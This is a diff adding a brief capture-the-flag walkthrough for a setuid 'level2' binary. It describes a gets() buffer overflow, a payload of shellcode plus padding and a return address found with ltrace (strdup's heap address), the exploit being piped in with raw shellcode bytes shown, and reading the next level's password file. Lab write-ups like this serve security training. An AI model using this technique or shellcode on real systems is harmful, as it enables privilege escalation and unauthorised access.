@@ -1,0 +1,45 @@
+level2 walkthrough
+==================
+
+1. 
+$ ls -l
+-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
+
+
+2.
+$ ./level2
+//waiting for input
+
+3. ghidra usage 
+
+find that can overflow the char* in p function
+
+4. write a script to overflow the buffer
+and which will can do go through the if statement
+
+so I write a buff which contain shellcode + A * 76 - len(shellcode) + end + <address> to call the shellcode
+
+5. first time for <address> I give the p function address and it goes to segv
+
+6. 
+$ ltrace ./level2
+__libc_start_main(0x804853f, 1, 0xbffff764, 0x8048550, 0x80485c0 <unfinished ...>
+fflush(0xb7fd1a20)                                                                                                = 0
+gets(0xbffff66c, 0, 0, 0xb7e5ec73, 0x80482b5
+)                                                                     = 0xbffff66c
+puts(""
+)                                                                                                          = 1
+strdup("")                                                                                                        = 0x0804a008
++++ exited (status 8) +++
+
+get the strdup address which contain a shellcode
+
+7. for second call I give the address of strdup
+$ (cat /tmp/exploit; cat) | ./level2 
+ls
+1�Ph//shh/bin��PS�ᙰ
+                   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBls
+ls
+ls: cannot open directory .: Permission denied
+cd ../level3
+cat .pass
